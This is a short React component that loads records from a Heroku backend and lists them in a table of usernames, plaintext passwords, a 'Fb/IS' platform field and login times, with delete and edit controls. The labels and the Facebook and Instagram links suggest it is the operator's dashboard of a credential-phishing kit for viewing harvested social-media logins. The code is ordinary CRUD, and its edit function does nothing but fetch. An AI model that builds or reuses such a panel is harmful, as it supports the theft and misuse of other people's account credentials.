import React, {useState,useEffect} from 'react'
import axios from 'axios'
import './Password.css'
import { BrowserRouter, Route, Link } from "react-router-dom";
import Editpassword from './Editpassword';
function Password() {

    const [Products,setProducts] = useState([])

    useEffect(() => {
        const fetchProducts = async () => {
          const { data} = await axios.get(`https://backendaloginda.herokuapp.com/exercises`)
          setProducts(data)
          console.log(data)
        }
        fetchProducts()
        }, [])
        
const deleteRecord = async (id,name) => {
    await axios.delete(`https://backendaloginda.herokuapp.com/exercises/${id}`)
    console.log(`${name} deleted successfully`)
}

const editRecord = async (id,name,description) => {
  await axios.get(`https://backendaloginda.herokuapp.com/exercises/${id}`);
}
    return (
 <div className='cont'>
    <a href="/Facebook">Facebook</a>
    <a href="/"> Instagram</a>
<table>
  <thead>
  <tr>
    <th>Username</th>
    <th>Password</th>
    <th>Fb/IS</th>
    <th>Delete?</th>
    <th>Edit Record</th>
    <th>Login Time</th> 
  </tr>
  </thead>
  {
    Products.map((product, i) => 
    <tr key={i}>
      <td>{product.username}</td>
      <td>{product.description}</td>
      <td>{product.duration}</td>
      <td><p onClick={(e) => {deleteRecord(product._id,product.username)}}> Delete </p></td>
      <td><p onClick={(e) => {editRecord(product._id,product.username)}}> Edit </p></td>
      <td>{product.date}</td>
    </tr>
    ).reverse()
  }
</table>
</div>
    )
}

export default Password
